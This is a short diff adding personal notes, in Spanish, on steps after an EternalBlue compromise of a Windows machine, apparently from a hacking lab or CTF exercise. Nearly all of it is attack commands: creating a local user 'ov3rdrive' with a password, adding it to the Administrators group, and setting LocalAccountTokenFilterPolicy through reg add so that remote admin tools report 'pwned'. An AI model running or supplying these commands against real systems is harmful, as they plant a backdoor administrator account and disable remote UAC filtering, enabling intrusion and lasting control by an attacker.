@@ -1,0 +1,11 @@
+eternalblue shell restringida de la maquina
+
+
+net user ov3rdrive password /add
+
+net localgroup administrators ov3rdrive /add
+
+y para que nos salga pwned 
+
+
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
